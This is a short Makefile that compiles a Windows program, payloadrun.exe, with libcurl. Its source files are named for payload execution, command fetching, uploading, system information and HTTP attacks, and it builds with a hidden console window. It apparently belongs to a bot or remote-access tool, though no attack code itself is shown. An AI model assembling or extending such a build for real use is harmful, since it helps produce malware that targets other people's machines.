# -------- CONFIG --------
CC = gcc
CFLAGS = -Ilib -Ifeatures -IC:/curl/include -DPAYLOAD_EXEC
SRC = features/payload.c lib/command_fetch.c features/upload.c features/info_advanced.c features/http_attack.c lib/utils.c
OUT = payloadrun.exe
LDFLAGS = -LC:/curl/lib -lcurl -liphlpapi -lws2_32 -mwindows

# -------- RULES --------
all: $(OUT)

$(OUT): $(SRC)
	$(CC) $(SRC) $(CFLAGS) $(LDFLAGS) -o $(OUT)

clean:
	del /Q *.exe *.o >nul 2>&1 || exit 0
